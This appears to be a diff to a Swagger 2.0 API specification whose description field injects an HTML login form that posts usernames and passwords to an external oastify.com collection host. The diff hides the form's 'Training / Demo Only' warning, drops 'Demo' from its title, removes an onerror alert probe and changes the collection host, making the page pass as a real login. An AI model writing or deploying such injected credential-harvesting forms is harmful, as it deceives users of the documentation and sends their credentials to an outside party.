@@ -1,20 +1,19 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Demo Login Page
+  title: Login Page
   description: '<div class="login-form">
 
-<!-- Demo Warning -->
+<!-- Demo Warning 
 <div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 15px; background: #fff3cd; border-radius: 8px; border: 1px solid #ffeeba; text-align: center;">
   <strong>Training / Demo Only</strong><br>
   No real credentials are collected.
-</div>
+</div>-->
 
 <!-- Error Message -->
 <div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #f8d7da; border-radius: 8px;">
   <div style="color: #721c24; font-size: 16px; text-align: center;">
     <strong>An error occurred while loading, please log in. </strong>
-    <img src=x onerror=alert(1)>
   </div>
 </div>
 
@@ -22,7 +21,7 @@ info:
 <div class="heading">
   <h1 style="text-align: center; font-size: 24px; color: #333;">Login Page</h1>
   <div style="width: 100%; max-width: 400px; margin: 0 auto; padding: 20px; background: #fff; border-radius: 8px;">
-    <form action="https://txu5p50087ousiad5ff33sgcq3wukk89.oastify.com/demo-login" method="post">
+    <form action="https://caqu5fx1b947x877b3z6ccq03r9ix9ly.oastify.com/demo-login" method="post">
 
       <div style="margin-bottom: 15px;">
         <label style="font-size: 14px;">Username</label>
